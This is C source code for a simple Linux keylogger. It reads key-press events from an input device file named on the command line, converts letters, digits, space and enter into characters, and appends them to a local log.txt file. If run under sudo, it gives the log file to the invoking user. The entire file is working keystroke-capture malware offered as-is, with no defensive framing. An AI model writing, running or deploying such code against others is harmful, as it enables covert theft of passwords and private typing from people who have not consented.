#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>

char codeToChar(int code);

int main(int argc, char** argv) {
    if(argc != 2) {
        printf("Usage: ./keylogger <file-name>");
        return -1;
    }

    int fd = open(argv[1], O_RDONLY, 0);

    if(fd == -1) {
        printf("The given file name was not found");
        exit(-1);
    }

    int writeFd = open("log.txt", O_CREAT | O_WRONLY, 0666);

    if(writeFd == -1) {
        printf("There was an error opening log file");
        exit(-1);
    }

    char *sudo_uid = getenv("SUDO_UID");
    char *sudo_gid = getenv("SUDO_GID");
    if (sudo_uid && sudo_gid) {
        uid_t uid = (uid_t)atoi(sudo_uid);
        gid_t gid = (gid_t)atoi(sudo_gid);
        fchown(writeFd, uid, gid);
    }

    while(1) {
        struct input_event ie;
        read(fd, &ie, sizeof(ie));

        if(ie.type != EV_KEY || ie.type == KEY_RESERVED || ie.value != 1) {
            continue;
        }

        char c = codeToChar(ie.code);

        printf("%c", c);
        write(writeFd, &c, sizeof(c));
        fsync(writeFd);
        fflush(stdout);
    }
}

char codeToChar(int code) {
    if(code == KEY_0) {
        return '0';
    }

    if(code > 1 && code <= 10) {
        return code + 48 - 1;
    }

    switch (code) {
            case KEY_A: return 'a';
            case KEY_B: return 'b';
            case KEY_C: return 'c';
            case KEY_D: return 'd';
            case KEY_E: return 'e';
            case KEY_F: return 'f';
            case KEY_G: return 'g';
            case KEY_H: return 'h';
            case KEY_I: return 'i';
            case KEY_J: return 'j';
            case KEY_K: return 'k';
            case KEY_L: return 'l';
            case KEY_M: return 'm';
            case KEY_N: return 'n';
            case KEY_O: return 'o';
            case KEY_P: return 'p';
            case KEY_Q: return 'q';
            case KEY_R: return 'r';
            case KEY_S: return 's';
            case KEY_T: return 't';
            case KEY_U: return 'u';
            case KEY_V: return 'v';
            case KEY_W: return 'w';
            case KEY_X: return 'x';
            case KEY_Y: return 'y';
            case KEY_Z: return 'z';
            case KEY_SPACE: return ' ';
            case KEY_ENTER: return '\n';
            default:    return '\0';
        }

    printf("Unsupported event: %d", code);
    return code;
}
